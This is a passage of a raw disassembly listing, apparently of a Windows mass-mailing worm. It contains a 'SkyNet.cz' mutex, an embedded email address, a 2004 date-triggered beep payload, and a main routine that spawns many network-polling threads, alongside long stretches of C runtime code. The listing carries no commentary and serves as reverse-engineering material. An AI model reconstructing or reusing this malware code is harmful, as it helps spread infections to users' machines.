		jnz	short loc_4029BF
		cmp	[ebp+SystemTime.wYear],	7D4h
		jnz	short loc_4029BF
		cmp	[ebp+SystemTime.wHour],	6
		jz	short loc_40299F
		cmp	[ebp+SystemTime.wHour],	7
		jz	short loc_40299F
		cmp	[ebp+SystemTime.wHour],	8
		jnz	short loc_4029BF

loc_40299F:				; CODE XREF: sub_402955+3Aj
					; sub_402955+41j
		call	sub_401910
		push	32h
		cdq
		pop	ecx
		idiv	ecx
		push	edx		; dwDuration
		call	sub_401910
		cdq
		mov	ecx, 0BB8h
		idiv	ecx
		push	edx		; dwFreq
		call	ds:Beep

loc_4029BF:				; CODE XREF: sub_402955+24j
					; sub_402955+2Bj ...
		push	32h		; dwMilliseconds
		call	ds:Sleep
		jmp	short loc_40296A
sub_402955	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


; DWORD	__stdcall sub_4029C9(LPVOID)
sub_4029C9	proc near		; DATA XREF: WinMain(x,x,x,x)+D1o

var_18		= dword	ptr -18h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4

		push	ecx
		push	ecx
		push	ebx
		push	ebp
		mov	ebp, ds:InternetGetConnectedState
		push	esi
		push	edi
		mov	edi, ds:Sleep

loc_4029DB:				; CODE XREF: sub_4029C9+28j
					; sub_4029C9+32j ...
		push	32h		; dwMilliseconds
		call	edi ; Sleep
		and	[esp+18h+var_4], 0
		lea	eax, [esp+18h+var_4]
		push	0
		push	eax
		call	ebp ; InternetGetConnectedState
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_4029DB
		xor	esi, esi
		cmp	ds:dword_414BF8, esi
		jle	short loc_4029DB
		mov	[esp+20h+var_10], offset dword_40AAF0

loc_402A05:				; CODE XREF: sub_4029C9+78j
		cmp	ebx, 1
		jnz	short loc_4029DB
		cmp	byte ptr ds:dword_4082F0[esi], 0
		lea	eax, dword_4082F0[esi]
		jnz	short loc_402A26
		mov	[eax], bl
		mov	eax, [esp+20h+var_10]
		push	dword ptr [eax]
		call	sub_4019FF

loc_402A26:				; CODE XREF: sub_4029C9+4Ej
		lea	eax, [esp+20h+var_C]
		push	0
		push	eax
		call	ebp ; InternetGetConnectedState
		push	32h		; dwMilliseconds
		mov	ebx, eax
		call	edi ; Sleep
		inc	esi
		add	[esp+28h+var_18], 4
		cmp	esi, ds:dword_414BF8
		jl	short loc_402A05
		jmp	short loc_4029DB
sub_4029C9	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


; __stdcall WinMain(x,x,x,x)
_WinMain@16	proc near		; CODE XREF: start+C9p

var_1C4		= dword	ptr -1C4h
var_1B8		= dword	ptr -1B8h
ThreadId	= dword	ptr -1B4h
var_1B0		= dword	ptr -1B0h
var_1AC		= dword	ptr -1ACh
var_1A8		= dword	ptr -1A8h
var_1A4		= dword	ptr -1A4h
var_1A0		= dword	ptr -1A0h
var_19C		= dword	ptr -19Ch
var_198		= dword	ptr -198h
var_194		= dword	ptr -194h
WSAData		= WSAData ptr -190h

		sub	esp, 1B8h
		push	ebx
		push	esi
		call	ds:GetTickCount
		push	eax		; lpName
		call	sub_40192E
		xor	esi, esi
		mov	[esp+1C4h+var_1C4], offset aSkynet_czSyste ; "[SkyNet.cz]SystemsMutex"
		push	esi		; bInitialOwner
		push	esi		; lpMutexAttributes
		call	ds:CreateMutexA
		mov	ds:dword_414BF4, eax
		call	ds:GetLastError
		cmp	eax, 0B7h
		jnz	short loc_402A89
		pop	esi
		xor	eax, eax
		pop	ebx
		add	esp, 1B8h
		retn	10h
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402A89:				; CODE XREF: WinMain(x,x,x,x)+35j
		push	ebp
		lea	eax, [esp+1C4h+WSAData]
		push	edi
		push	eax		; lpWSAData
		push	101h		; wVersionRequested
		call	ds:WSAStartup
		mov	ecx, 0A00h
		xor	eax, eax
		mov	edi, offset dword_4082F0
		rep stosd
		call	sub_402770
		mov	edi, offset aSkoorpio@yahoo ; "skoorpio@yahoo.com"
		mov	ds:dword_414BF8, esi
		push	edi		; char *
		call	_strlen
		push	eax
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	ecx, ds:dword_414BF8
		push	edi		; char *
		push	eax		; char *
		mov	ds:dword_40AAF0[ecx*4],	eax
		call	_strcpy
		add	esp, 10h
		mov	edi, ds:CreateThread
		inc	ds:dword_414BF8
		lea	eax, [esp+1C8h+ThreadId]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	offset StartAddress ; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		lea	eax, [esp+1C8h+var_194]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	offset sub_402955 ; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		mov	ebx, ds:Sleep
		push	1Ah		; dwMilliseconds
		call	ebx ; Sleep
		lea	eax, [esp+1C8h+var_1AC]
		mov	ebp, offset sub_4029C9
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	ebp		; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		push	1Bh		; dwMilliseconds
		call	ebx ; Sleep
		lea	eax, [esp+1C8h+var_19C]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	ebp		; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		push	1Ch		; dwMilliseconds
		call	ebx ; Sleep
		lea	eax, [esp+1C8h+var_1A4]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	ebp		; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		push	1Dh		; dwMilliseconds
		call	ebx ; Sleep
		lea	eax, [esp+1C8h+var_1B8]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	ebp		; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		push	1Dh		; dwMilliseconds
		call	ebx ; Sleep
		lea	eax, [esp+1C8h+var_1B0]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	ebp		; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		push	1Dh		; dwMilliseconds
		call	ebx ; Sleep
		lea	eax, [esp+1C8h+var_1A8]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	ebp		; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		push	1Dh		; dwMilliseconds
		call	ebx ; Sleep
		lea	eax, [esp+1C8h+var_1A0]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	ebp		; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		push	1Dh		; dwMilliseconds
		call	ebx ; Sleep
		lea	eax, [esp+1C8h+var_198]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	ebp		; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		pop	edi
		pop	ebp

loc_402B95:				; CODE XREF: WinMain(x,x,x,x)+157j
		push	3E8h		; dwMilliseconds
		call	ebx ; Sleep
		jmp	short loc_402B95
_WinMain@16	endp

; [00000006 BYTES: COLLAPSED FUNCTION GetNetworkParams.	PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000058 BYTES: COLLAPSED FUNCTION _memset. PRESS KEYPAD "+"	TO EXPAND]
; [0000000E BYTES: COLLAPSED FUNCTION operator new(uint). PRESS	KEYPAD "+" TO EXPAND]
		align 10h

; void *__cdecl	memcpy(void *,const void *,size_t)
_memcpy:				; CODE XREF: sub_4012AF+56p
					; sub_4012AF+5Ep ...
		push	ebp
		mov	ebp, esp
		push	edi
		push	esi
		mov	esi, [ebp+0Ch]
		mov	ecx, [ebp+10h]
		mov	edi, [ebp+8]
		mov	eax, ecx
		mov	edx, ecx
		add	eax, esi
		cmp	edi, esi
		jbe	short loc_402C40
		cmp	edi, eax
		jb	loc_402DB8

loc_402C40:				; CODE XREF: A:00402C36j
		test	edi, 3
		jnz	short loc_402C5C
		shr	ecx, 2
		and	edx, 3
		cmp	ecx, 8
		jb	short near ptr dword_402C7C
		rep movsd
		jmp	ds:off_402D68[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402C5C:				; CODE XREF: A:00402C46j
		mov	eax, edi
		mov	edx, 3
		sub	ecx, 4
		jb	short loc_402C74
		and	eax, 3
		add	ecx, eax
		jmp	ds:dword_402C80[eax*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402C74:				; CODE XREF: A:00402C66j
		jmp	ds:TrailUp0[ecx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
dword_402C7C	dd 0FC8D24FFh		; CODE XREF: A:00402C51j
dword_402C80	dd 9000402Ch		; DATA XREF: A:00402C6Dr
		dd offset dword_402C90
		dd offset LeadUp2
		dd offset LeadUp3
dword_402C90	dd 68AD123h, 468A0788h,	1478801h, 0C102468Ah, 478802E9h
					; DATA XREF: A:00402C84o
		dd 3C68302h, 8303C783h,	0CC7208F9h, 24FFA5F3h, 402D6895h
		dd 498D00h
LeadUp2		dd 68AD123h, 468A0788h,	2E9C101h, 83014788h, 0C78302C6h
					; DATA XREF: A:00402C88o
		dd 8F98302h, 0A5F3A672h, 689524FFh, 9000402Dh
LeadUp3		dd 68AD123h, 0C1460788h, 834702E9h, 8C7208F9h, 24FFA5F3h
					; DATA XREF: A:00402C8Co
		dd 402D6895h, 498D00h, 402D5Fh,	402D4Ch, 402D44h, 402D3Ch
		dd 402D34h, 402D2Ch, 402D24h, 402D1Ch
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

UnwindUp7:
		mov	eax, [esi+ecx*4-1Ch]
		mov	[edi+ecx*4-1Ch], eax

UnwindUp6:
		mov	eax, [esi+ecx*4-18h]
		mov	[edi+ecx*4-18h], eax

UnwindUp5:
		mov	eax, [esi+ecx*4-14h]
		mov	[edi+ecx*4-14h], eax

UnwindUp4:
		mov	eax, [esi+ecx*4-10h]
		mov	[edi+ecx*4-10h], eax

UnwindUp3:
		mov	eax, [esi+ecx*4-0Ch]
		mov	[edi+ecx*4-0Ch], eax

UnwindUp2:
		mov	eax, [esi+ecx*4-8]
		mov	[edi+ecx*4-8], eax

UnwindUp1:
		mov	eax, [esi+ecx*4-4]
		mov	[edi+ecx*4-4], eax
		lea	eax, ds:0[ecx*4]
		add	esi, eax
		add	edi, eax

UnwindUp0:
		jmp	ds:off_402D68[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
off_402D68	dd offset TrailUp0	; DATA XREF: A:00402C55r A:UnwindUp0r
		dd offset TrailUp1
		dd offset TrailUp2
		dd offset TrailUp3
TrailUp0	dd 5E08458Bh		; CODE XREF: A:00402C55j
					; DATA XREF: A:loc_402C74r ...
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		pop	edi
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h
; [0000000B BYTES: COLLAPSED FUNCTION TrailUp1.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000011 BYTES: COLLAPSED FUNCTION TrailUp2.	PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000017 BYTES: COLLAPSED FUNCTION TrailUp3.	PRESS KEYPAD "+" TO EXPAND]
		align 4

loc_402DB8:				; CODE XREF: A:00402C3Aj
		lea	esi, [ecx+esi-4]
		lea	edi, [ecx+edi-4]
		test	edi, 3
		jnz	short loc_402DEC
		shr	ecx, 2
		and	edx, 3
		cmp	ecx, 8
		jb	short loc_402DE0
		std
		rep movsd
		cld
		jmp	ds:off_402F00[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h

loc_402DE0:				; CODE XREF: A:00402DD1j A:00402E28j ...
		neg	ecx
		jmp	ds:off_402EB0[ecx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4

loc_402DEC:				; CODE XREF: A:00402DC6j
		mov	eax, edi
		mov	edx, 3
		cmp	ecx, 4
		jb	short near ptr dword_402E04
		and	eax, 3
		sub	ecx, eax
		jmp	ds:dword_402E08[eax*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_402E04	dd 8D24FFh		; CODE XREF: A:00402DF6j
dword_402E08	dd 9000402Fh		; DATA XREF: A:00402DFDr
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		sbb	[esi], ch
		inc	eax
		add	[eax], bh
		db	2Eh
		inc	eax
		add	[eax+2Eh], ah
		inc	eax
		add	[edx-2EDCFCBAh], cl
		mov	[edi+3], al
		dec	esi
		shr	ecx, 2
		dec	edi
		cmp	ecx, 8
		jb	short loc_402DE0
		std
		rep movsd
		cld
		jmp	ds:off_402F00[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4

LeadDown2:
		mov	al, [esi+3]
		and	edx, ecx
		mov	[edi+3], al
		mov	al, [esi+2]
		shr	ecx, 2
		mov	[edi+2], al
		sub	esi, 2
		sub	edi, 2
		cmp	ecx, 8
		jb	short loc_402DE0
		std
		rep movsd
		cld
		jmp	ds:off_402F00[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h

LeadDown3:
		mov	al, [esi+3]
		and	edx, ecx
		mov	[edi+3], al
		mov	al, [esi+2]
		mov	[edi+2], al
		mov	al, [esi+1]
		shr	ecx, 2
		mov	[edi+1], al
		sub	esi, 3
		sub	edi, 3
		cmp	ecx, 8
		jb	loc_402DE0
		std
		rep movsd
		cld
		jmp	ds:off_402F00[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
		dd offset UnwindDown7
		dd offset UnwindDown6
		dd offset UnwindDown5
		dd offset UnwindDown4
		dd offset UnwindDown3
		dd offset UnwindDown2
		dd offset UnwindDown1
off_402EB0	dd offset UnwindDown0	; DATA XREF: A:00402DE2r
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

UnwindDown7:				; DATA XREF: A:00402E94o
		mov	eax, [esi+ecx*4+1Ch]
		mov	[edi+ecx*4+1Ch], eax

UnwindDown6:				; DATA XREF: A:00402E98o
		mov	eax, [esi+ecx*4+18h]
		mov	[edi+ecx*4+18h], eax

UnwindDown5:				; DATA XREF: A:00402E9Co
		mov	eax, [esi+ecx*4+14h]
		mov	[edi+ecx*4+14h], eax

UnwindDown4:				; DATA XREF: A:00402EA0o
		mov	eax, [esi+ecx*4+10h]
		mov	[edi+ecx*4+10h], eax

UnwindDown3:				; DATA XREF: A:00402EA4o
		mov	eax, [esi+ecx*4+0Ch]
		mov	[edi+ecx*4+0Ch], eax

UnwindDown2:				; DATA XREF: A:00402EA8o
		mov	eax, [esi+ecx*4+8]
		mov	[edi+ecx*4+8], eax

UnwindDown1:				; DATA XREF: A:00402EACo
		mov	eax, [esi+ecx*4+4]
		mov	[edi+ecx*4+4], eax
		lea	eax, ds:0[ecx*4]
		add	esi, eax
		add	edi, eax
; [0000005E BYTES: COLLAPSED FUNCTION UnwindDown0. PRESS KEYPAD	"+" TO EXPAND]
		align 10h
; [00000007 BYTES: COLLAPSED FUNCTION _strcpy. PRESS KEYPAD "+"	TO EXPAND]
		align 10h
; [000000E0 BYTES: COLLAPSED FUNCTION _strcat. PRESS KEYPAD "+"	TO EXPAND]
; [0000007B BYTES: COLLAPSED FUNCTION _strlen. PRESS KEYPAD "+"	TO EXPAND]
; [0000000B BYTES: COLLAPSED FUNCTION operator delete(void *). PRESS KEYPAD "+"	TO EXPAND]
		align 10h
; [0000002F BYTES: COLLAPSED FUNCTION __alloca_probe. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000080 BYTES: COLLAPSED FUNCTION _strstr. PRESS KEYPAD "+"	TO EXPAND]
; [00000028 BYTES: COLLAPSED FUNCTION _isdigit.	PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [000000FE BYTES: COLLAPSED FUNCTION _strncpy.	PRESS KEYPAD "+" TO EXPAND]
		align 10h
; START	OF FUNCTION CHUNK FOR _strchr

loc_4032C0:				; CODE XREF: _strchr+1Dj
		lea	eax, [edx-1]
		pop	ebx
		retn
; END OF FUNCTION CHUNK	FOR _strchr
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h
; [000000BC BYTES: COLLAPSED FUNCTION _strchr. PRESS KEYPAD "+"	TO EXPAND]
		align 10h
; [00000084 BYTES: COLLAPSED FUNCTION _strcmp. PRESS KEYPAD "+"	TO EXPAND]
; [000000EB BYTES: COLLAPSED FUNCTION start. PRESS KEYPAD "+" TO EXPAND]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		mov	esp, [ebp-18h]
		push	dword ptr [ebp-68h]
		call	__exit
; [00000025 BYTES: COLLAPSED FUNCTION __amsg_exit. PRESS KEYPAD	"+" TO EXPAND]
; [00000024 BYTES: COLLAPSED FUNCTION _fast_error_exit.	PRESS KEYPAD "+" TO EXPAND]
; [00000012 BYTES: COLLAPSED FUNCTION _malloc. PRESS KEYPAD "+"	TO EXPAND]
; [0000002C BYTES: COLLAPSED FUNCTION __nh_malloc. PRESS KEYPAD	"+" TO EXPAND]
; [00000036 BYTES: COLLAPSED FUNCTION __heap_alloc. PRESS KEYPAD "+" TO	EXPAND]
; [0000002F BYTES: COLLAPSED FUNCTION _free. PRESS KEYPAD "+" TO EXPAND]
; [00000075 BYTES: COLLAPSED FUNCTION __isctype. PRESS KEYPAD "+" TO EXPAND]
; [0000002D BYTES: COLLAPSED FUNCTION __cinit. PRESS KEYPAD "+"	TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION _exit. PRESS KEYPAD "+" TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __exit. PRESS KEYPAD "+" TO EXPAND]
; [00000099 BYTES: COLLAPSED FUNCTION _doexit. PRESS KEYPAD "+"	TO EXPAND]
; [0000001A BYTES: COLLAPSED FUNCTION __initterm. PRESS	KEYPAD "+" TO EXPAND]
; [00000141 BYTES: COLLAPSED FUNCTION __XcptFilter. PRESS KEYPAD "+" TO	EXPAND]
; [00000043 BYTES: COLLAPSED FUNCTION _xcptlookup. PRESS KEYPAD	"+" TO EXPAND]
; [00000058 BYTES: COLLAPSED FUNCTION __wincmdln. PRESS	KEYPAD "+" TO EXPAND]
; [000000B9 BYTES: COLLAPSED FUNCTION __setenvp. PRESS KEYPAD "+" TO EXPAND]
; [00000099 BYTES: COLLAPSED FUNCTION __setargv. PRESS KEYPAD "+" TO EXPAND]
; [000001B4 BYTES: COLLAPSED FUNCTION _parse_cmdline. PRESS KEYPAD "+" TO EXPAND]
; [00000132 BYTES: COLLAPSED FUNCTION ___crtGetEnvironmentStringsA. PRESS KEYPAD "+" TO	EXPAND]
; [000001AB BYTES: COLLAPSED FUNCTION __ioinit.	PRESS KEYPAD "+" TO EXPAND]
; [0000003C BYTES: COLLAPSED FUNCTION __heap_init. PRESS KEYPAD	"+" TO EXPAND]
; [00000020 BYTES: COLLAPSED FUNCTION __global_unwind2.	PRESS KEYPAD "+" TO EXPAND]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

__unwind_handler:			; DATA XREF: __local_unwind2+Ao
					; __abnormal_termination+9o
		mov	ecx, [esp+4]
		test	dword ptr [ecx+4], 6
		mov	eax, 1
		jz	short locret_403FA9
		mov	eax, [esp+8]
		mov	edx, [esp+10h]
		mov	[edx], eax
		mov	eax, 3

locret_403FA9:				; CODE XREF: A:00403F98j
		retn
; [00000068 BYTES: COLLAPSED FUNCTION __local_unwind2. PRESS KEYPAD "+"	TO EXPAND]
; [00000023 BYTES: COLLAPSED FUNCTION __abnormal_termination. PRESS KEYPAD "+" TO EXPAND]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

__NLG_Notify1:
		push	ebx
		push	ecx
		mov	ebx, offset dword_408144
		jmp	short loc_404048
; [00000018 BYTES: COLLAPSED FUNCTION __NLG_Notify. PRESS KEYPAD "+" TO	EXPAND]
		align 4
		push	esi
		inc	ebx
		xor	dh, [eax]
		pop	eax
		inc	ebx
		xor	[eax], dh
; [000000BD BYTES: COLLAPSED FUNCTION unknown_libname_1. PRESS KEYPAD "+" TO EXPAND]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

unknown_libname_8:			; Microsoft VisualC 2-7/net runtime
		push	ebp
		mov	ecx, [esp+8]
		mov	ebp, [ecx]
		mov	eax, [ecx+1Ch]
		push	eax
		mov	eax, [ecx+18h]
		push	eax
		call	__local_unwind2
		add	esp, 8
		pop	ebp
		retn	4
; [00000039 BYTES: COLLAPSED FUNCTION __FF_MSGBANNER. PRESS KEYPAD "+" TO EXPAND]
; [00000153 BYTES: COLLAPSED FUNCTION __NMSG_WRITE. PRESS KEYPAD "+" TO	EXPAND]
; [0000001B BYTES: COLLAPSED FUNCTION __callnewh. PRESS	KEYPAD "+" TO EXPAND]
; [0000003E BYTES: COLLAPSED FUNCTION ___sbh_heap_init.	PRESS KEYPAD "+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION ___sbh_find_block. PRESS KEYPAD "+" TO EXPAND]
; [0000032B BYTES: COLLAPSED FUNCTION ___sbh_free_block. PRESS KEYPAD "+" TO EXPAND]
; [00000309 BYTES: COLLAPSED FUNCTION ___sbh_alloc_block. PRESS	KEYPAD "+" TO EXPAND]
; [000000B1 BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_region. PRESS KEYPAD "+"	TO EXPAND]
; [000000FB BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_group. PRESS KEYPAD "+" TO EXPAND]
; [00000149 BYTES: COLLAPSED FUNCTION ___crtGetStringTypeA. PRESS KEYPAD "+" TO	EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __ismbblead. PRESS KEYPAD	"+" TO EXPAND]
; [00000031 BYTES: COLLAPSED FUNCTION _x_ismbbtype. PRESS KEYPAD "+" TO	EXPAND]
; [00000199 BYTES: COLLAPSED FUNCTION __setmbcp. PRESS KEYPAD "+" TO EXPAND]
; [0000004A BYTES: COLLAPSED FUNCTION _getSystemCP. PRESS KEYPAD "+" TO	EXPAND]
; [00000033 BYTES: COLLAPSED FUNCTION _CPtoLCID. PRESS KEYPAD "+" TO EXPAND]
; [00000029 BYTES: COLLAPSED FUNCTION _setSBCS.	PRESS KEYPAD "+" TO EXPAND]
; [00000185 BYTES: COLLAPSED FUNCTION _setSBUpLow. PRESS KEYPAD	"+" TO EXPAND]
; [0000001C BYTES: COLLAPSED FUNCTION ___initmbctable. PRESS KEYPAD "+"	TO EXPAND]
; [00000089 BYTES: COLLAPSED FUNCTION ___crtMessageBoxA. PRESS KEYPAD "+" TO EXPAND]
		align 10h

_memcpy_0:				; CODE XREF: ___sbh_free_block+2EEp
		push	ebp
		mov	ebp, esp
		push	edi
		push	esi
		mov	esi, [ebp+0Ch]
		mov	ecx, [ebp+10h]
		mov	edi, [ebp+8]
		mov	eax, ecx
		mov	edx, ecx
		add	eax, esi
		cmp	edi, esi
		jbe	short loc_405140
		cmp	edi, eax
		jb	loc_4052B8

loc_405140:				; CODE XREF: A:00405136j
		test	edi, 3
		jnz	short loc_40515C
		shr	ecx, 2
		and	edx, 3
		cmp	ecx, 8
		jb	short near ptr dword_40517C
		rep movsd
		jmp	ds:off_405268[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40515C:				; CODE XREF: A:00405146j
		mov	eax, edi
